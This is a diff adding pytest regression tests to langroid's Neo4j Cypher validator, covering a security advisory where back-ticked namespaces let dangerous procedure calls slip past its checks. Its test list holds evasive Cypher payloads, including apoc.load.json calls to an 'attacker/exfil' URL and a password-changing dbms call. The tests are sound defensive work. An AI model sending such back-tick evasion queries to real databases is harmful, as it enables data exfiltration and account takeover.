@@ -11,6 +11,7 @@ import pytest
 
 from langroid.agent.special.neo4j.cypher_validator import (
     _strip_literals_and_comments,
+    _unescape_backticked_names,
     validate_cypher_query,
 )
 
@@ -105,3 +106,60 @@ def test_strip_literals_and_comments() -> None:
     assert "MERGE" not in _strip_literals_and_comments("MATCH (n:`MERGE`) RETURN n")
     # real clause text is preserved
     assert "RETURN" in _strip_literals_and_comments("MATCH (n) RETURN n")
+
+
+# ---------------------------------------------------------------------------
+# Back-ticked procedure namespaces (GHSA-v5gj-pcf6-jjh7, and the identical
+# earlier GHSA-h75w-m9jv-2c6v / GHSA-8c3r-3hgh-c8hv).
+#
+# Neo4j resolves `apoc` and apoc identically (openCypher EscapedSymbolicName),
+# so back-ticking a namespace segment must not hide it from the procedure
+# checks -- while back-ticked labels and property keys named after keywords
+# must still be exempt, since that is what the scrubber is for.
+# ---------------------------------------------------------------------------
+
+
+BACKTICKED_DANGEROUS = [
+    "CALL `apoc`.load.json('http://attacker/exfil')",
+    "CALL `dbms`.security.changePassword('newpass')",
+    "CALL `db`.schema.visualization()",
+    "CALL `apoc`.`load`.`json`('http://attacker/exfil')",
+    "CALL apoc.`load`.json('http://attacker/exfil')",
+]
+
+
+@pytest.mark.parametrize("query", BACKTICKED_DANGEROUS)
+@pytest.mark.parametrize("is_write", [True, False])
+def test_backticked_procedure_namespace_is_rejected(query: str, is_write: bool) -> None:
+    rejection = validate_cypher_query(query, is_write=is_write, allow_dangerous=False)
+    assert rejection is not None, f"backtick evasion slipped through: {query}"
+    assert "REJECTED" in rejection
+
+
+@pytest.mark.parametrize(
+    "query",
+    [
+        # Labels and property keys legitimately named after keywords stay
+        # back-ticked in real Cypher, and must not trip the write-clause check.
+        "MATCH (n:`CREATE`) RETURN n",
+        "MATCH (n:`DELETE`) RETURN n",
+        "MATCH (n) RETURN n.`set`",
+        "MATCH (n) RETURN n.`merge` AS m",
+        # A dangerous-looking name inside a string literal is still inert.
+        "MATCH (n:Person) WHERE n.name = 'apoc.load.json' RETURN n",
+        "MATCH (n) RETURN n // CALL apoc.load.json",
+    ],
+)
+def test_backticked_names_do_not_cause_false_positives(query: str) -> None:
+    assert validate_cypher_query(query, is_write=False, allow_dangerous=False) is None
+
+
+def test_backtick_normalization_preserves_offsets() -> None:
+    """Unescaping must not shift character offsets, so spans stay aligned."""
+    raw = "CALL `apoc`.load.json('u')"
+    assert len(_unescape_backticked_names(raw)) == len(raw)
+
+
+def test_allow_dangerous_still_bypasses_backtick_check() -> None:
+    for q in BACKTICKED_DANGEROUS:
+        assert validate_cypher_query(q, is_write=True, allow_dangerous=True) is None
